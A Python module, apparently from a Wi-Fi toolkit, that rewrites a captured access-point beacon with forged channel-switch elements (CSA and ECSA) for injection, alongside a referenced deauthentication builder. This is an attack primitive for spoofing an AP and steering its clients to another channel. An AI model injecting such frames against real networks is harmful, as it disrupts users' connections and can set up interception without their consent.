"""CSA/ECSA beacon rewrite: splice channel-switch announcement elements into a captured beacon."""
from wifit3.dot11.chan import channel_operating_class, same_band
from wifit3.dot11.ie import csa_ie, ecsa_ie, secondary_channel_offset_ie

_ELEMID_CSA = 0x25
_ELEMID_ECSA = 0x3C
_BEACON_BODY_LEN = 36   # 24B MAC header + 12B fixed (timestamp, interval, capability); IEs follow


def build_csa_beacon(beacon: bytes, new_channel: int, *, from_channel: int, count: int = 0) -> bytes:
    """The AP's beacon announcing a switch to ``new_channel``, seq-control zeroed for HW-restamp.
    Always carries an ECSA (tag 60, band-aware via operating class); adds legacy CSA (tag 37) only for
    a same-band switch, since a bare channel number is ambiguous across bands. Injectable MPDU."""
    if len(beacon) < _BEACON_BODY_LEN:
        raise ValueError(f"beacon too short to rewrite: {len(beacon)} bytes")
    header = bytearray(beacon[:_BEACON_BODY_LEN])
    header[22:24] = b"\x00\x00"           # seq/frag control: HW-stamped per frame, like the deauth builder
    tags = beacon[_BEACON_BODY_LEN:]
    kept = bytearray()
    ptr = 0
    while ptr + 2 <= len(tags):
        end = ptr + 2 + tags[ptr + 1]
        if end > len(tags):
            break
        if tags[ptr] not in (_ELEMID_CSA, _ELEMID_ECSA):
            kept += tags[ptr:end]
        ptr = end
    switch = bytearray()
    if same_band(from_channel, new_channel):
        switch += csa_ie(new_channel, count=count)
    switch += ecsa_ie(new_channel, operating_class=channel_operating_class(new_channel), count=count)
    return bytes(header) + bytes(kept) + bytes(switch) + secondary_channel_offset_ie(0)
